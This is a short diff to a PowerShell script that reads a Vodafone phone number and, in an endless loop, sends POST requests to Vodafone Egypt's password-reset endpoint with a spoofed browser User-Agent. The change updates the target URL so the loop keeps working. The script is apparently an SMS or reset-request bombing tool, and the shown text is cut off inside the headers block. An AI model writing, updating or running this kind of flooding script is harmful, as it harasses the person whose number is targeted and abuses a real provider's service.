@@ -1,6 +1,6 @@
 ﻿$n = Read-Host -Prompt 'Input phone number "vodafone"'
 while ($true) {
-Invoke-WebRequest -Uri "https://www.vodafone.com.eg/userAcc/forgotPass" `
+Invoke-WebRequest -Uri "https://web.vodafone.com.eg/auth/realms/vf-realm/login-actions/reset-credentials?client_id=website&tab_id=ZjX6QmtH5xU&kc_locale=ar" `
 -Method "POST" `
 -Headers @{
 "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
